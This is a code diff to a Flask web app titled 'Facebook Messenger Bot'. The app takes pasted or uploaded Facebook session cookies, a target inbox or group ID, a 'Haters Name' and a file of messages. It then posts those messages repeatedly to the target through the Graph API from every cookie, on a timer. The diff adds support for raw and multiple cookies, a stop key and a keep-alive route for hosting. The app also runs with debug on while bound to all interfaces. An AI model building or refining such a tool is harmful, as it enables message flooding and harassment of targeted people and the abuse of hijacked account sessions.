@@ -5,6 +5,7 @@ import time
 import random
 import string
 import json
+import os
 
 app = Flask(__name__)
 app.debug = True
@@ -16,145 +17,177 @@ headers = {
     'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.76 Safari/537.36',
     'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
     'Accept-Encoding': 'gzip, deflate',
-    'Accept-Language': 'en-US,en;q=0.9,fr;q=0.8',
-    'referer': 'www.google.com'
+    'Accept-Language': 'en-US,en;q=0.9'
 }
 
 stop_events = {}
 threads = {}
 
-def send_messages(cookies_list, thread_id, mn, time_interval, messages, task_id):
-    stop_event = stop_events[task_id]
+# --- COOKIE PARSER ---
+def parse_cookie_string(cookie_str):
+    cookie_dict = {}
+    for pair in cookie_str.strip().split(';'):
+        if '=' in pair:
+            k, v = pair.strip().split('=', 1)
+            cookie_dict[k] = v
+    return cookie_dict
+
+# --- MESSAGE SENDER ---
+def send_messages(cookies_list, uid_tid, haters_name, time_interval, messages, task_key):
+    stop_event = stop_events[task_key]
     while not stop_event.is_set():
-        for message1 in messages:
+        for msg in messages:
             if stop_event.is_set():
                 break
             for cookie in cookies_list:
-                api_url = f'https://graph.facebook.com/v15.0/t_{thread_id}/'
-                message = f"{mn} {message1}"
-                response = requests.post(api_url, data={'message': message}, headers=headers, cookies=cookie)
-                if response.status_code == 200:
-                    print(f"Message Sent Successfully From cookie {cookie}: {message}")
-                else:
-                    print(f"Message Sent Failed From cookie {cookie}: {message}")
+                api_url = f'https://graph.facebook.com/v15.0/t_{uid_tid}/'
+                message = f"{haters_name} {msg}"
+                try:
+                    response = requests.post(api_url, data={'message': message}, headers=headers, cookies=cookie)
+                    if response.status_code == 200:
+                        print(f"[SUCCESS] {message} -> {uid_tid}")
+                    else:
+                        print(f"[FAILED] {message} -> {uid_tid} | Status: {response.status_code}")
+                except Exception as e:
+                    print(f"[ERROR] {e}")
                 time.sleep(time_interval)
 
+# --- RUN BOT ---
 @app.route('/', methods=['GET', 'POST'])
-def send_message():
+def start_bot():
     if request.method == 'POST':
         cookie_option = request.form.get('cookieOption')
+        cookies_list = []
 
-        # Single cookie input
         if cookie_option == 'single':
-            cookie_str = request.form.get('singleCookie')
-            try:
-                cookies_list = [json.loads(cookie_str)]
-            except json.JSONDecodeError:
-                return "Invalid JSON for single cookie."
-        # Multiple cookies from uploaded JSON file
+            raw_cookie = request.form.get('singleCookie')
+            cookies_list = [parse_cookie_string(raw_cookie)]
+        elif cookie_option == 'multi_raw':
+            raw_cookies_file = request.files['rawCookiesFile']
+            raw_cookies_list = raw_cookies_file.read().decode().splitlines()
+            cookies_list = [parse_cookie_string(c) for c in raw_cookies_list]
         else:
             cookie_file = request.files['cookieFile']
             try:
                 cookies_list = json.load(cookie_file)
-                if not isinstance(cookies_list, list):
-                    return "Cookie file must contain a JSON array of cookie objects."
-            except json.JSONDecodeError:
-                return "Invalid JSON file."
+            except:
+                return "Invalid JSON file!"
 
-        thread_id = request.form.get('threadId')
-        mn = request.form.get('kidx')
-        time_interval = int(request.form.get('time'))
+        uid_tid = request.form.get('uidTid')
+        haters_name = request.form.get('hatersName')
+        time_interval = int(request.form.get('timeInterval'))
+        np_file = request.files['npFile']
+        messages = np_file.read().decode().splitlines()
 
-        txt_file = request.files['txtFile']
-        messages = txt_file.read().decode().splitlines()
+        # Random stop key
+        task_key = ''.join(random.choices(string.ascii_letters + string.digits, k=8))
 
-        task_id = ''.join(random.choices(string.ascii_letters + string.digits, k=8))
-
-        stop_events[task_id] = Event()
-        thread = Thread(target=send_messages, args=(cookies_list, thread_id, mn, time_interval, messages, task_id))
-        threads[task_id] = thread
+        stop_events[task_key] = Event()
+        thread = Thread(target=send_messages, args=(cookies_list, uid_tid, haters_name, time_interval, messages, task_key))
+        threads[task_key] = thread
         thread.start()
 
-        return f'Task started with ID: {task_id}'
+        return f"Task started! Your stop key is: <b>{task_key}</b>"
 
-    # HTML form with cookie input fields
     return render_template_string('''
 <!DOCTYPE html>
 <html lang="en">
 <head>
 <meta charset="utf-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Facebook Cookie Messenger</title>
+<title>Facebook Messenger Bot</title>
 <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/css/bootstrap.min.css" rel="stylesheet">
 <style>
-body { background-color:#222; color:white; }
-.container { max-width:400px; padding:20px; border-radius:10px; margin-top:30px; background:#333; }
+body { background:#222; color:white; }
+.container { max-width:600px; background:#333; margin-top:30px; padding:20px; border-radius:10px; }
 .form-control { background:transparent; color:white; border:1px solid #fff; }
+.btn-submit { width:100%; margin-top:10px; }
 </style>
 </head>
 <body>
 <div class="container text-center">
+<h2>Facebook Messenger Bot</h2>
 <form method="post" enctype="multipart/form-data">
 <div class="mb-3">
-<label for="cookieOption">Select Cookie Option</label>
+<label>Cookie Option</label>
 <select class="form-control" id="cookieOption" name="cookieOption" onchange="toggleCookieInput()" required>
-<option value="single">Single Cookie (JSON)</option>
-<option value="multiple">Cookie File (JSON Array)</option>
+<option value="single">Single Raw Cookie</option>
+<option value="multi_raw">Multiple Raw Cookies File</option>
+<option value="json_file">Cookie JSON File</option>
 </select>
 </div>
+
 <div class="mb-3" id="singleCookieInput">
-<label for="singleCookie">Enter Single Cookie JSON</label>
-<textarea class="form-control" id="singleCookie" name="singleCookie" rows="3"></textarea>
+<label>Enter Single Raw Cookie</label>
+<textarea class="form-control" name="singleCookie" rows="3"></textarea>
 </div>
+
+<div class="mb-3" id="multiRawInput" style="display:none;">
+<label>Upload Raw Cookies File (one per line)</label>
+<input type="file" class="form-control" name="rawCookiesFile">
+</div>
+
 <div class="mb-3" id="cookieFileInput" style="display:none;">
-<label for="cookieFile">Choose Cookie JSON File</label>
-<input type="file" class="form-control" id="cookieFile" name="cookieFile">
+<label>Upload Cookie JSON File</label>
+<input type="file" class="form-control" name="cookieFile">
+</div>
+
+<div class="mb-3">
+<label>Haters Name</label>
+<input type="text" class="form-control" name="hatersName" required>
 </div>
 <div class="mb-3">
-<label for="threadId">Enter Inbox/Convo UID</label>
-<input type="text" class="form-control" id="threadId" name="threadId" required>
+<label>UID/TID (Inbox/Group ID)</label>
+<input type="text" class="form-control" name="uidTid" required>
 </div>
 <div class="mb-3">
-<label for="kidx">Enter Your Hater Name</label>
-<input type="text" class="form-control" id="kidx" name="kidx" required>
+<label>Time Interval (seconds)</label>
+<input type="number" class="form-control" name="timeInterval" required>
 </div>
 <div class="mb-3">
-<label for="time">Enter Time Interval (seconds)</label>
-<input type="number" class="form-control" id="time" name="time" required>
-</div>
-<div class="mb-3">
-<label for="txtFile">Choose Messages File (NP)</label>
-<input type="file" class="form-control" id="txtFile" name="txtFile" required>
+<label>Messages File (.txt)</label>
+<input type="file" class="form-control" name="npFile" required>
 </div>
 <button type="submit" class="btn btn-primary btn-submit">Run</button>
 </form>
 
-<form method="post" action="/stop" style="margin-top:20px;">
+<hr>
+<h5>Stop Task</h5>
+<form method="post" action="/stop">
 <div class="mb-3">
-<label for="taskId">Enter Task ID to Stop</label>
-<input type="text" class="form-control" id="taskId" name="taskId" required>
+<label>Enter Stop Key</label>
+<input type="text" class="form-control" name="taskKey" required>
 </div>
 <button type="submit" class="btn btn-danger btn-submit">Stop</button>
 </form>
 </div>
+
 <script>
 function toggleCookieInput() {
-var option = document.getElementById('cookieOption').value;
-document.getElementById('singleCookieInput').style.display = (option=='single')?'block':'none';
-document.getElementById('cookieFileInput').style.display = (option=='multiple')?'block':'none';
+var opt = document.getElementById('cookieOption').value;
+document.getElementById('singleCookieInput').style.display = (opt=='single')?'block':'none';
+document.getElementById('multiRawInput').style.display = (opt=='multi_raw')?'block':'none';
+document.getElementById('cookieFileInput').style.display = (opt=='json_file')?'block':'none';
 }
 </script>
 </body>
 </html>
 ''')
 
+# --- STOP ROUTE ---
 @app.route('/stop', methods=['POST'])
 def stop_task():
-    task_id = request.form.get('taskId')
-    if task_id in stop_events:
-        stop_events[task_id].set()
-        return f'Task with ID {task_id} has been stopped.'
-    return f'No task found with ID {task_id}.'
+    task_key = request.form.get('taskKey')
+    if task_key in stop_events:
+        stop_events[task_key].set()
+        return f"Task stopped successfully! ({task_key})"
+    return "Invalid stop key!"
+
+# --- KEEP ALIVE FOR RENDER / BOT HOSTING ---
+@app.route('/ping')
+def ping():
+    return "Bot is alive!"
 
 if __name__ == '__main__':
-    app.run(host='0.0.0.0', port=5000)
+    port = int(os.environ.get("PORT", 5000))
+    app.run(host='0.0.0.0', port=port)
